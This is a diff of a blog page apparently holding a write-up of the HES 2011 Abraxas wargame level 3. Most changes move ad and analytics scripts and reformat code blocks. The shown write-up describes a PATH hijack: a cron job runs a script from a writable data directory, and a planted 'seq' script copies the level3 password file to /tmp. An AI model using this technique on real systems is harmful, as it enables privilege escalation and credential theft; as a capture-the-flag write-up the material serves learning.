@@ -12,26 +12,6 @@
   <link rel="stylesheet" href="/assets/css/main.css">
   <link rel="canonical" href="/binholic/2013/03/06/hes-2011-abraxas-wargame-level-3.html">
   <link rel="alternate" type="application/rss+xml" title="Binary World for Binary People :)" href="/feed.xml">
-
-  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
-<script>
-     (adsbygoogle = window.adsbygoogle || []).push({
-          google_ad_client: "ca-pub-9302170278788846",
-          enable_page_level_ads: true
-     });
-</script>
-
-
-  <!-- Global site tag (gtag.js) - Google Analytics -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=UA-16686496-2"></script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
-
-  gtag('config', 'UA-16686496-2');
-</script>
-
 </head>
 
 
@@ -127,7 +107,8 @@
 3
 </pre></td><td class="code"><pre><span class="nv">$ </span><span class="nb">cat</span> /etc/cron.d/lifesupport_process 
 
-<span class="k">*</span>/10 <span class="k">*</span> <span class="k">*</span> <span class="k">*</span> <span class="k">*</span>    level3 /home/level3/bin/lifesupport_process.sh &amp;&gt; /dev/null</pre></td></tr></tbody></table></code></pre></figure>
+<span class="k">*</span>/10 <span class="k">*</span> <span class="k">*</span> <span class="k">*</span> <span class="k">*</span>    level3 /home/level3/bin/lifesupport_process.sh &amp;&gt; /dev/null
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>We read it:</p>
 
@@ -164,7 +145,7 @@
 <span class="nb">.</span> common.inc.sh
 
 <span class="c"># life support stats</span>
-<span class="nv">data</span><span class="o">=</span><span class="k">$(</span><span class="nv">$scriptdir</span>/lifesupport_data.sh<span class="k">)</span>
+<span class="nv">data</span><span class="o">=</span><span class="si">$(</span><span class="nv">$scriptdir</span>/lifesupport_data.sh<span class="si">)</span>
 
 <span class="nb">echo</span>    <span class="s2">"Orig:      </span><span class="nv">$data</span><span class="s2">"</span>
 <span class="nb">echo</span> <span class="nt">-n</span> <span class="s2">"Sorted:    "</span><span class="p">;</span> mysort <span class="nv">$data</span>
@@ -172,7 +153,8 @@
 <span class="nb">echo</span> <span class="nt">-n</span> <span class="s2">"Average:   "</span><span class="p">;</span> avg <span class="nv">$data</span>
 <span class="nb">echo</span> <span class="nt">-n</span> <span class="s2">"Max:       "</span><span class="p">;</span> max <span class="nv">$data</span>
 <span class="nb">echo</span> <span class="nt">-n</span> <span class="s2">"Min:       "</span><span class="p">;</span> min <span class="nv">$data</span>
-<span class="nb">echo</span> <span class="nt">-n</span> <span class="s2">"Cumulated: "</span><span class="p">;</span> cumul <span class="nv">$data</span></pre></td></tr></tbody></table></code></pre></figure>
+<span class="nb">echo</span> <span class="nt">-n</span> <span class="s2">"Cumulated: "</span><span class="p">;</span> cumul <span class="nv">$data</span>
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>mmm, we can see datadir in PATH! Interesting.</p>
 
@@ -189,7 +171,8 @@ total 16K
 4.0K drwxr-xr-x  4 root root   4.0K 2011-04-06 10:54 <span class="nb">.</span>
 4.0K drwxr-xr-x 21 root root   4.0K 2011-09-02 14:17 ..
 4.0K drwx-wx--x  2 root level2 4.0K 2013-03-06 02:17 lifesupportdata
-4.0K drwxr-xr-x  6 root root   4.0K 2011-04-05 00:07 workpackagebuilder</pre></td></tr></tbody></table></code></pre></figure>
+4.0K drwxr-xr-x  6 root root   4.0K 2011-04-05 00:07 workpackagebuilder
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>We can write to /opt/lifesupportdata!
 So we can use PATH to redirect to out script.
@@ -218,7 +201,8 @@ I tried with echo but no luck, so when looking at lifesupport_data.sh:</p>
   </span><span class="nb">echo</span> <span class="nt">-n</span> <span class="k">$((</span>RANDOM <span class="o">%</span> <span class="m">100</span><span class="k">))</span>
   <span class="nb">echo</span> <span class="nt">-n</span> <span class="s2">" "</span>
 <span class="k">done
-</span><span class="nb">echo</span></pre></td></tr></tbody></table></code></pre></figure>
+</span><span class="nb">echo</span>
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>seq work wonderfully, here is the exploit:</p>
 
@@ -239,7 +223,8 @@ I tried with echo but no luck, so when looking at lifesupport_data.sh:</p>
 /bin/cat /etc/pass/level3 &gt; /tmp/lvl3.pass
 </span><span class="no">EOF
 
-</span><span class="nb">chmod </span>a+x /opt/lifesupportdata/seq</pre></td></tr></tbody></table></code></pre></figure>
+</span><span class="nb">chmod </span>a+x /opt/lifesupportdata/seq
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>And yes, the script run as whatever id you run it at, so you can do anything.
 Now, you’ve just got to wait every 10 minutes ;).</p>
@@ -351,6 +336,26 @@ Now, you’ve just got to wait every 10 minutes ;).</p>
   </div>
 
 </footer>
+
+<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({
+          google_ad_client: "ca-pub-9302170278788846",
+          enable_page_level_ads: true
+     });
+</script>
+
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-16686496-2"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-16686496-2');
+</script>
+
 
 
   </body>
